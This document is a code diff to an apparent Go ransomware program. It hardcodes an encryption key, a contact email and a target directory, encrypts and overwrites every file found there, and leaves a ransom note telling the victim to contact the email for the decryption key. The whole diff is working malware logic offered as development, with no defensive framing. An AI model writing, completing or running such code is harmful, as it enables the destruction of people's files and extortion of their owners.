@@ -13,7 +13,13 @@ import (
 )
 
 func main() {
-	cryptoKey := os.Getenv("CRYPTO_KEY")
+	cryptoKey := "16379a3da689dff87ff6ac71fd8abebcd4261c596fdf7a027aa32196c371372d" // Insert generated Key
+	contact := "test@test.com"                                                      // Insert contact email
+	dir := "/Downloads/Test"                                                        // Insert starting directory
+
+	if cryptoKey == "" {
+		panic("need crypto key! \nrun 'go run keygen/main.go' to get a crypto key")
+	}
 
 	key, err := hex.DecodeString(cryptoKey)
 
@@ -21,7 +27,7 @@ func main() {
 		panic(err)
 	}
 
-	files := explorer.MapFiles()
+	files := explorer.MapFiles(dir)
 
 	for _, v := range files {
 		file, err := ioutil.ReadFile(v)
@@ -39,9 +45,9 @@ func main() {
 		ioutil.WriteFile(v, encrypted, 0644)
 	}
 
-	msg := "Your files have been encrypted."
+	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."
 
-	err = ioutil.WriteFile(os.Getenv("HOME")+"/Downloads/Test/readme.txt", []byte(msg), 0644)
+	err = ioutil.WriteFile(os.Getenv("HOME")+dir+"/readme.txt", []byte(msg), 0644)
 
 	if err != nil {
 		panic(err)
